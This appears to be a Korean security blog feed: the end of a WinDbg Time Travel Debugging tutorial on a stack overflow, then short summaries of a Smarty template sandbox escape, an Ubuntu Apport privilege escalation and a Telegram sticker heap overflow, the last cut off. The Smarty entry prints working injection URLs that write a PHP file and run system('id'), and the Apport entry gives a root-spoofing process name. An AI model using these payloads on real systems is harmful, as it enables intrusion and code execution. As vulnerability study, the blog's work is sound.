&#xACBD;&#xC6B0;&#xC5D0;&#xB294; 0x113fab4)&#xC5D0; Write access&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xB54C; &#xAC78;&#xB9AC;&#xB294; breakpoint&#xB97C; &#xAC78;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><div class="caption"><span>text</span></div><code class="hljs plain">ba w4 0113fab4</code></pre><p><img src="/2021/02/21/fabu1ous/ttd-2/17.png" alt></p><p>Breakpoint&#xB97C; &#xAC78;&#xACE0; Go Back(&#xBA85;&#xB839;&#xC5B4; &#x201C;g-&#x201C;)&#xB97C; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;. <code>ucrtbased!common_tcscpy_s&lt;wchar_t&gt;+0x187</code>&#xC5D0; &#xB418;&#xAC10;&#xAE30;&#xAC00; &#xBA48;&#xCD94;&#xB124;&#xC694;.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/18.png" alt></p><p>&#xC2A4;&#xD0DD;&#xC758; &#xC0C1;&#xD669;&#xC744; &#xC0B4;&#xD3B4;&#xBD05;&#xC2DC;&#xB2E4;.</p><p>main() &#x2192; GetCppGreeting() &#x2192; wcscpy_s()</p><p><code>main()</code>&#xC758; &#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784;&#xC774; &#xB9DD;&#xAC00;&#xC84C;&#xC73C;&#xB2C8; &#xC800;&#xD76C;&#xAC00; &#xC791;&#xC131;&#xD55C; <code>GetCppConGreeting()</code>&#xC5D0; root cause&#xAC00; &#xC788;&#xC744; &#xD655;&#xB960;&#xC774; &#xB192;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; &#xAC1C;&#xBC1C;&#xC790;&#xB77C;&#xBA74; <code>GetCppConGreeting()</code>&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC5F4;&#xC5B4; &#xBCFC;&#xD14C;&#xACE0;, &#xC800;&#xAC19;&#xC774; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;&#xAC00; &#xBAA9;&#xC801;&#xC774;&#xB77C;&#xBA74; IDA&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xC744; &#xD558;&#xACA0;&#xC9C0;&#xB9CC; TTD&#xC5D0; &#xC9D1;&#xC911;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC880; &#xB354; TTD&#xB97C; &#xC368;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/19.png" alt></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">dx &amp;ttd_part2!GetCppConGreetingbu &amp;ttd_part2!GetCppConGreeting</code></pre><p>&#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xAC70;&#xB77C; &#xC758;&#xC2EC;&#xB418;&#xB294; <code>GetCppGreeting()</code>&#xC758; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xC5D0; breakpoint&#xB97C; &#xAC78;&#xACE0;</p><p><img src="/2021/02/21/fabu1ous/ttd-2/20.png" alt></p><p>&#xC544;&#xAE4C; &#xC2A4;&#xD0DD;&#xC774; &#xC624;&#xC5FC;&#xB418;&#xB294; &#xC2DC;&#xC810;&#xC744; &#xCC3E;&#xAE30; &#xC704;&#xD574; &#xAC78;&#xC5B4;&#xC92C;&#xB358; breakpoint&#xB294; &#xC0AD;&#xC81C;&#xD574;&#xC90D;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/21.png" alt></p><p>&#xADF8;&#xB9AC;&#xACE0; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2DC;&#xC791; &#xC9C0;&#xC810;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xAC00; Go(&#xBA85;&#xB839;&#xC5B4; &#x201C;g&#x201D;)&#xB97C; &#xD1B5;&#xD574; <code>GetCppConGreeting()</code>&#xC758; &#xD504;&#xB864;&#xB85C;&#xADF8;&#xB85C; &#xC774;&#xB3D9;&#xD574;&#xC90D;&#xC2DC;&#xB2E4;. EAX&#xAC00; &#xB208;&#xC5D0; &#xB4E4;&#xC5B4;&#xC624;&#xB294;&#xB370; &#xC544;&#xB9C8; &#xC800;&#xAE30;&#xAC00; &#xCD9C;&#xB825; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xBCF5;&#xC0AC;&#xB418;&#xB294; Destination&#xC774;&#xACA0;&#xC8E0;?</p><p><img src="/2021/02/21/fabu1ous/ttd-2/22.png" alt></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">gu</code></pre><p><code>GetCppConGreeting()</code>&#xC774; &#xC2E4;&#xD589;&#xC744; &#xB9C8;&#xCE58;&#xACE0; &#xB2E4;&#xC2DC; <code>main()</code>&#xC73C;&#xB85C; &#xB9AC;&#xD134;&#xD55C; &#xC9C1;&#xD6C4; &#xC704;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD588;&#xB358; EAX &#xC704;&#xCE58;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xC608;&#xC0C1;&#xD588;&#xB358; &#xAC83;&#xCC98;&#xB7FC; Destination&#xC774; &#xB9DE;&#xC2B5;&#xB2C8;&#xB2E4;. <code>GetCppConGreeting()</code>&#xC758; &#xB2E4;&#xB978; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD574; &#xBCF4;&#xBA74; root cause&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC744; &#xAC70; &#xAC19;&#xAD70;&#xC694;.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/23.png" alt></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">!tt 0gg-uub eip</code></pre><p>&#xB2E4;&#xC2DC;<code>GetCppConGreeting()</code>&#xC758; &#xD638;&#xCD9C; &#xC2DC;&#xC810;&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xD55C; &#xD6C4; &#x201C;g-u&#x201D;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD638;&#xCD9C; &#xC9C1;&#xC804;&#xC73C;&#xB85C; &#xB418;&#xB3CC;&#xB824;&#xC90D;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; &#xD604;&#xC7AC; EIP&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC5B4;&#xB5A4; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xB4E4;&#xC744; &#xC2E4;&#xD589;&#xD588;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574; &#xBCF4;&#xBA74; <code>GetCppConGreeting( [EAX], 0x64 )</code>, &#xC989; &#xC544;&#xAE4C; &#xD655;&#xC778;&#xD588;&#xB358; Destination&#xACFC; 0x64(100)&#xAC00; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC778;&#xAC78; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/24.png" alt></p><p><img src="/2021/02/21/fabu1ous/ttd-2/25.png" alt></p><p>&#xB9CC;&#xC57D; &#xC2EC;&#xBCFC;&#xC774; &#xC0B4;&#xC544;&#xC788;&#xB294; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC744; &#xBD84;&#xC11D; &#xC911;&#xC774;&#xB77C;&#xBA74; &#xC0C1;&#xB2E8; &#xBA54;&#xB274; &gt; Watch &#xB808;&#xC774;&#xBE14;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xC870;&#xAE08; &#xB354; &#xC27D;&#xAC8C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/26.png" alt></p><p><img src="/2021/02/21/fabu1ous/ttd-2/27.png" alt></p><p><code>GetCppConGreeting()</code>&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xD30C;&#xB77C;&#xBBF8;&#xD130; dest_buf(<code>0x113fa50</code>)&#xB97C; &#xC0B4;&#xD3B4;&#xBD05;&#xC2DC;&#xB2E4;. &#xD06C;&#xAE30;&#xB294; 100 bytes &#xB124;&#xC694;? 100 bytes &#xBC84;&#xD37C;&#xC5D0; size 100 &#xB9CC;&#xD07C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xBCF5;&#xC0AC;&#xD558;&#xB294; &#xB4EF;&#xD55C;&#xB370; &#xC65C; &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC78;&#xAE4C;&#xC694;? &#xC124;&#xB839; Stack overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD574;&#xB3C4; SFP&#xB9CC; &#xC624;&#xC5FC;&#xB418;&#xC57C; &#xD560; &#xC0C1;&#xD669; &#xAC19;&#xC740;&#xB370; RET&#xC774; &#xC624;&#xC5FC;&#xB420; &#xC774;&#xC720;&#xB294; &#xC5C6;&#xC5B4; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/28.png" alt></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">uf ttd_part2!GetCppConGreeting</code></pre><p><code>GetCppConGreeting()</code> &#xD568;&#xC218;&#xC758; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xB4E4;&#xC744; &#xC0B4;&#xD3B4;&#xBD05;&#xC2DC;&#xB2E4;. &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xBCF5;&#xC0AC;&#xD560; &#xB54C; Wide character&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD568;&#xC218;<code>wcscpy_s()</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xAD70;&#xC694;. &#xC989; 100 bytes &#xBC84;&#xD37C;&#xC5D0; 100 bytes &#xBCF5;&#xC0AC;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C; 200 bytes(wchar_t 100&#xAC1C;) &#xBCF5;&#xC0AC;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/29.png" alt></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">gudc 0113fa50</code></pre><p>&#xB530;&#xB77C;&#xC11C; &#xC704; &#xC0AC;&#xC9C4;&#xC5D0;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xB4EF;&#xC774; 100 bytes &#xBC84;&#xD37C;&#xB97C; &#xB118;&#xC5B4;&#xC11C; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD2B8; &#xB41C; SFP&#xC640; RET&#xAE4C;&#xC9C0; &#xC624;&#xC5FC;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/29-1.png" alt></p><p>&#xCC3E;&#xC558;&#xB2E4;! Root Cause!</p><h1 id="Part-III-&#xC608;&#xACE0;"><a href="#Part-III-&#xC608;&#xACE0;" class="headerlink" title="Part III &#xC608;&#xACE0;"></a>Part III &#xC608;&#xACE0;</h1><p><img src="/2021/02/21/fabu1ous/ttd-2/31.png" alt></p><p>&#xC6D0;&#xB798;&#xB294; TTD&#xB97C; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;&#xC5D0; &#xC0AC;&#xC6A9;&#xD574;&#xBCF4;&#xBA74;&#xC11C; &#xB290;&#xB080; &#xC810;&#xC774;&#xB098; &#xAFC0;&#xD301; &#xB4F1;&#xC744; &#xC815;&#xB9AC;&#xD574; &#xC62C;&#xB9B4; &#xC0DD;&#xAC01;&#xC774;&#xC5C8;&#xB294;&#xB370; &#xCD5C;&#xADFC;&#xC5D0; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;&#xB97C; &#xAC70;&#xC758; &#xC548; &#xD574;&#xC11C; &#xC0C1;&#xD669;&#xC744; &#xC880;&#xB354; &#xC9C0;&#xCF1C;&#xBD10;&#xC57C; &#xD560; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xBC88; &#xAE00;&#xC744; &#xC791;&#xC131;&#xD558;&#xBA74;&#xC11C; <code>dx</code>&#xBA85;&#xB839;&#xC5B4;&#xC640; TTD.Memory object&#xB97C; &#xAC19;&#xC774; &#xC4F0;&#xB294; &#xBC29;&#xBC95;&#xB3C4; &#xACF5;&#xBD80;&#xB97C; &#xD574;&#xBD24;&#xB294;&#xB370; &#xC5C4;&#xCCAD; &#xC88B;&#xB354;&#xB77C;&#xACE0;&#xC694;.</p><p>&#xB2E4;&#xC74C; part 3&#xB294;</p><ol><li>TTD &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;&#xC5D0; &#xC0AC;&#xC6A9;&#xD574;&#xBCF4;&#xAE30;</li><li>&#xACE0;&#xC624;&#xAE09; &#xC0AC;&#xC6A9;&#xBC95;</li></ol><p>&#xC774; &#xB458; &#xC911; &#xD558;&#xB098;&#xB97C; &#xB4E4;&#xACE0; &#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windbg</tag>
      
      <tag>time travel debugging</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Smarty Template Engine Sandbox escape</title>
    <link href="/2021/02/20/fabu1ous/2021-02-20/"/>
    <url>/2021/02/20/fabu1ous/2021-02-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html">Smarty Template Engine Sandbox escape PHP Code Injection</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Smarty Endgine &lt;= 3.1.38</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Smarty&#xB294; PHP&#xC6A9; template engine&#xC785;&#xB2C8;&#xB2E4;. Smarty&#xB294; presentation(html/css)&#xACFC; app logic&#xC744; &#xBD84;&#xB9AC;&#xC2DC;&#xD0A4;&#xB294; PHP insulation(sandbox)&#xC744; &#xD1B5;&#xD574; injection &#xACF5;&#xACA9;&#xC758; &#xD53C;&#xD574;&#xBC94;&#xC704;&#xB97C; &#xC81C;&#xD55C;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; Template injection&#xC774; &#xAC00;&#xB2A5;&#xD560; &#xB54C; sandbox escape&#xB97C; &#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>CVE-2021-26119</li></ul><p>super global &#xBCC0;&#xC218; <code>$smarty.template_object</code>&#xB97C; &#xC774;&#xC6A9;&#xD55C;  Template injection&#xC774; &#xAC00;&#xB2A5;&#xD560; &#xB54C; Smarty&#xC758; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>compile</code>&#xD568;&#xC218;&#xAC00; <code>{$poc=$smarty.template_object}</code>&#xC640; &#xAC19;&#xC740; &#xAC12;&#xC744; &#xBC1B;&#xC73C;&#xBA74; <code>$poc</code>&#xC5D0; <code>Smarty_Internal_Template</code> &#xAC1D;&#xCCB4;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs csharp"><span class="hljs-keyword">object</span>(Smarty_Internal_Template)<span class="hljs-meta">#7 (24) {  </span>  [<span class="hljs-meta"><span class="hljs-meta-string">&quot;_objType&quot;</span></span>]=&gt;  <span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)    [<span class="hljs-meta"><span class="hljs-meta-string">&quot;smarty&quot;</span></span>]=&gt;  &amp;<span class="hljs-keyword">object</span>(Smarty)<span class="hljs-meta">#1 (76) { ... }</span>  [<span class="hljs-meta"><span class="hljs-meta-string">&quot;source&quot;</span></span>]=&gt;  <span class="hljs-keyword">object</span>(Smarty_Template_Source)<span class="hljs-meta">#8 (16) { ... }</span>  [<span class="hljs-meta"><span class="hljs-meta-string">&quot;parent&quot;</span></span>]=&gt;  <span class="hljs-keyword">object</span>(Smarty)<span class="hljs-meta">#1 (76) { ... }</span>  [<span class="hljs-meta"><span class="hljs-meta-string">&quot;ext&quot;</span></span>]=&gt;  <span class="hljs-keyword">object</span>(Smarty_Internal_Extension_Handler)<span class="hljs-meta">#10 (4) { ... }</span>  [<span class="hljs-meta"><span class="hljs-meta-string">&quot;compiled&quot;</span></span>]=&gt;  <span class="hljs-keyword">object</span>(Smarty_Template_Compiled)<span class="hljs-meta">#11 (12) { ... }</span></code></pre><p>&#xC704;&#xB294; <code>Smarty_Internal_Template</code>&#xAC1D;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; <code>[&quot;smarty&quot;]</code>&#xB610;&#xB294; <code>[&quot;parent&quot;]</code> &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD574; Smarty&#xC758; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xACE0; arbitrary file write&#xB85C; &#xACF5;&#xACA9; &#xBC94;&#xC704;&#xB97C; &#xD655;&#xC7A5;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs URL">http://localhost:8000/page.php?poc=string:{$s=$smarty.template_object-&gt;smarty}{$fp=$smarty.template_object-&gt;compiled-&gt;filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+phpinfo();&quot;,$s)}</code></pre><ul><li>CVE-2021-26120</li></ul><p>template syntax&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>Smarty_Internal_Runtime_TPlFunction</code>&#xD074;&#xB798;&#xC2A4;&#xB294; attacker controlled data&#xC778; <code>name</code>&#xC744; &#xD544;&#xD130;&#xB9C1;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xD568;&#xC218; &#xC778;&#xC81D;&#xC158;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs javascript"><span class="hljs-comment">/* input = {function name=&apos;test&apos;}{/function} */</span><span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">&apos;smarty_template_function_test_8782550315ffc7c00946f78_05745875&apos;</span>)) {    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">smarty_template_function_test_8782550315ffc7c00946f78_05745875</span>(<span class="hljs-params">Smarty_Internal_Template $_smarty_tpl,$params</span>) </span>{    foreach ($params <span class="hljs-keyword">as</span> $key =&gt; $value) {            $_smarty_tpl-&gt;tpl_vars[$key] = <span class="hljs-keyword">new</span> Smarty_Variable($value, $_smarty_tpl-&gt;isRenderingCache);        }    }}</code></pre><p>&#xC785;&#xB825; <code>{function name=&apos;test&apos;}{/function}</code>&#xC744; &#xBC1B;&#xC740; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB294; &#xC704;&#xC640; &#xAC19;&#xC740; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs URL">http://localhost:8000/page.php?poc=string:{function+name=&apos;rce(){};system(&quot;id&quot;);function+&apos;}{/function}</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>sandbox</tag>
      
      <tag>php</tag>
      
      <tag>injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Ubuntu 크래시 핸들러 Apport의 Local Privilege Escalation 취약점</title>
    <link href="/2021/02/19/l0ch/2021-02-19/"/>
    <url>/2021/02/19/l0ch/2021-02-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://alephsecurity.com/2021/02/16/apport-lpe/">Exploiting crash handlers: LPE on Ubuntu</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Ubuntu 20.10 - 2.20.11-0ubuntu50.5 &#xC774;&#xC804;</p><p>Ubuntu 20.04 - 2.20.11-0ubuntu27.16 &#xC774;&#xC804;</p><p>Ubuntu 18.04 - 2.20.9-0ubuntu7.23 &#xC774;&#xC804;</p><p>Ubuntu 16.04 - 2.20.1-0ubuntu2.30 &#xC774;&#xC804;</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Ubuntu&#xC758; &#xD06C;&#xB798;&#xC2DC; &#xD578;&#xB4E4;&#xB7EC;&#xC778; Apport&#xC5D0;&#xC11C; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Apport&#xB294; &#xC2E4;&#xD589; &#xC911;&#xC778; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xD06C;&#xB798;&#xC2DC; &#xBC1C;&#xC0DD; &#xC815;&#xBCF4;&#xB97C; &#xC218;&#xC9D1;&#xD558;&#xACE0; &#xD06C;&#xB798;&#xC2DC; &#xB9AC;&#xD3EC;&#xD2B8;&#xB97C; &#xB9CC;&#xB4DC;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Apport&#xB294; &#xD45C;&#xC900; &#xC785;&#xB825;&#xC5D0;&#xC11C; &#xCF54;&#xC5B4; &#xB364;&#xD504;&#xB97C; &#xC77D;&#xC5B4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xD604;&#xC7AC; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xC788;&#xB294; &#xCF54;&#xC5B4; &#xB364;&#xD504;&#xC5D0; &#xC0C8;&#xB85C; &#xC4F0;&#xB294; <code>write_user_coredump()</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. <code>write_user_coredump()</code> &#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAE30; &#xC804; <code>drop_privileges()</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xAE30;&#xC874; Apport&#xC758; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC744; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; uid&#xC640; gid&#xB85C; &#xBCC0;&#xACBD;&#xD574; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xCF54;&#xC5B4; &#xB364;&#xD504;&#xB97C; &#xC791;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C; <code>get_pid_info()</code> &#xD568;&#xC218;&#xB294; <code>/proc/pid/status</code> &#xD30C;&#xC77C;&#xC5D0;&#xC11C; uid&#xC640; gid&#xB97C; &#xAC01;&#xAC01; <code>Uid:</code> &#xBC0F; <code>Gid:</code>&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xD589;&#xC5D0;&#xC11C; &#xD30C;&#xC2F1; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC774;&#xB984;&#xC744; <code>a\rUid: 0\rGid: 0</code> &#xB85C; &#xC0DD;&#xC131;&#xD55C; &#xB4A4; &#xD06C;&#xB798;&#xC2DC;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xBA74; uid &#xBC0F; gid&#xAC00; 0&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xBBC0;&#xB85C; <code>drop_privileges()</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xC5EC; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC744; &#xC720;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xCDE8;&#xC57D;&#xC810;&#xC740; CVE-2021-25682&#xB97C; &#xD560;&#xB2F9;&#xBC1B;&#xC558;&#xC73C;&#xBA70; Apport&#xC758; &#xD06C;&#xB798;&#xC2DC; &#xBC1C;&#xC0DD; &#xC774;&#xD6C4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xAD50;&#xCCB4; &#xAC80;&#xC0AC; &#xC6B0;&#xD68C; &#xCDE8;&#xC57D;&#xC810;(<a href="https://alephsecurity.com/vulns/aleph-2021001">CVE-2021-25683</a>) &#xBC0F; &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80; &#xCDE8;&#xC57D;&#xC810;(<a href="https://alephsecurity.com/vulns/aleph-2021002">CVE-2021-25684</a>)&#xACFC; &#xAC19;&#xC774; &#xC545;&#xC6A9;&#xB418;&#xBA74; &#xCF54;&#xC5B4; &#xB364;&#xD504;&#xC5D0; &#xB9AC;&#xBC84;&#xC2A4; &#xC258; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD560; &#xC218; &#xC788;&#xC5B4; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>ubuntu</tag>
      
      <tag>L0ch</tag>
      
      <tag>local privilege escalation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] heap out-of-bounds write in Telegrams animated stickers</title>
    <link href="/2021/02/18/idioth/2021-02-18/"/>
    <url>/2021/02/18/idioth/2021-02-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.shielder.it/blog/2021/02/hunting-for-bugs-in-telegrams-animated-stickers-remote-attack-surface/">Hunting for bugs in Telegram&#x2019;s animated stickers remote attack surface</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>&#xD154;&#xB808;&#xADF8;&#xB7A8; &#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC; v7.1.0(2090) (2020&#xB144; 9&#xC6D4; 30&#xC77C; &#xB9B4;&#xB9AC;&#xC2A4;) &#xC774;&#xC804; &#xBC84;&#xC804;</li><li>&#xD154;&#xB808;&#xADF8;&#xB7A8; iOS v7.1 (2020&#xB144; 9&#xC6D4; 30&#xC77C; &#xB9B4;&#xB9AC;&#xC2A4;) &#xC774;&#xC804; &#xBC84;&#xC804;</li><li>&#xD154;&#xB808;&#xADF8;&#xB7A8; macOS v7.1 (2020&#xB144; 10&#xC6D4; 2&#xC77C; &#xB9B4;&#xB9AC;&#xC2A4;) &#xC774;&#xC804; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD154;&#xB808;&#xADF8;&#xB7A8; &#xBE44;&#xBC00; &#xCC44;&#xD305; &#xC560;&#xB2C8;&#xBA54;&#xC774;&#xC158; &#xC2A4;&#xD2F0;&#xCEE4; &#xAE30;&#xB2A5;&#xC5D0;&#xC11C; remote code execution&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD154;&#xB808;&#xADF8;&#xB7A8;&#xC740; &#xC560;&#xB2C8;&#xBA54;&#xC774;&#xC158; &#xC2A4;&#xD2F0;&#xCEE4;&#xB97C; &#xB80C;&#xB354;&#xB9C1; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; rlottie&#xB97C; &#xC218;&#xC815;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>VGradientCache::generateGradientColorTable</code>&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xBA70;, &#xBC18;&#xBCF5;&#xBB38;&#xC758; &#xBC94;&#xC704; &#xAC80;&#xC99D; &#xBBF8;&#xD761;&#xC73C;&#xB85C; heap memory out-of-bound write&#xC774; 